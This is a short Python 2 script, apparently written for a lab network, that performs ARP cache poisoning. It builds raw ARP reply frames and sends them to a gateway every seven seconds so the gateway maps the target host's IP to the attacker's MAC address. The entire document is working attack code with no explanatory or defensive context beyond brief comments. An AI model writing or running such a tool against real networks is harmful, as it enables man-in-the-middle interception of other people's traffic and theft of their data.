#!/usr/bin/python

#gateway is at .100, 08:00:27:3b:24:84
#attacking host is at .101, 08:00:27:f3:17:4b
#target host is at .102, 08:00:27:c5:1e:3c

import socket, sys, time
from struct import *

def macaddrtobytestr(addr):
  return "".join([chr(int(x, 16)) for x in addr.split(':')])

#glad this isn't little endian
def arppacket(destmac, destaddr, sourcemac, sourceaddr):
    #for ARP poisoning, destination addresses are the target addresses to poison ARP cache of
    #source MAC address is this hosts
    #source IP address is the target to be spoofed
    packet = ''
    packet += macaddrtobytestr(destmac)
    packet += macaddrtobytestr(sourcemac)
    packet += "\x08\x06" #ARP opcode, end of ethernet header
    packet += "\x00\x01" #Ethernet hardware type
    packet += "\x08\x00" #IP protocol
    packet += "\x06\x04" #MAC address size, IP address size
    packet += "\x00\x02" #ARP reply
    packet += macaddrtobytestr(sourcemac)
    packet += sourceaddr
    packet += macaddrtobytestr(destmac)
    packet += destaddr
    packet += "\x00" * 18
    return packet

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(("eth0", 0))

    packet = ''
    sourceip = "192.168.56.102"
    destip = "192.168.56.100"
    sourcemac = "08:00:27:f3:17:4b "
    destmac = "08:00:27:3b:24:84"

    print macaddrtobytestr(sourcemac)
    print macaddrtobytestr(destmac)

    sourceaddr = socket.inet_aton(sourceip)
    destaddr = socket.inet_aton(destip)
    

    while True:
        s.send(arppacket(destmac, destaddr, sourcemac, sourceaddr))
        time.sleep(7)

if __name__ == "__main__":
    main()
